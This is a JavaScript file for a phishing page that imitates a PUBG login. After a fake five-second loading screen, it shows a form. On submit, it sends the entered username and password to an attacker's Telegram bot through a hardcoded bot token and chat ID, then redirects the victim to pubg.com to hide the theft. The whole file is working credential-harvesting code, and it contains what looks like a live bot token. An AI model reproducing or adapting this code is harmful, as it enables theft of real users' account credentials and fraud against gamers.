let TOKEN_BOT = '7063874248:AAEDy0RYTlJNMOMor6-m_QF7PWNeuP7cr7k'
let CHAT_ID = '6670567088'

let body = document.querySelector('body')
let loading = document.querySelector('.loading')
let login = document.querySelector('#login')

setTimeout(() => {
    body.classList.remove("bg-[url('https://staticg.sportskeeda.com/editor/2024/01/b3109-17046051080206-1920.jpg')]")
    loading.classList.add('hidden')
    body.classList.add("bg-[url('https://staticg.sportskeeda.com/editor/2024/01/b3109-17046051080206-1920.jpg')]")
    login.classList.remove('hidden')
}, 5000);

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (e) => {
    e.preventDefault();

    const loginValue = inputs[0].value.trim();
    const passwordValue = inputs[1].value.trim();

    if (loginValue && passwordValue) {
        fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `\n\n LOGIN: ${inputs[0].value} \n PASSWORD: ${inputs[1].value}`,
            }),
        })
            .then(response => response.json())
            .then(malumot => {
                console.log(malumot);
                window.location.href = "https://pubg.com"
            })
            .catch(error => console.log("ERROR", error));
    } else {
        console.log("Error: Login and password cannot be empty");
    }
});
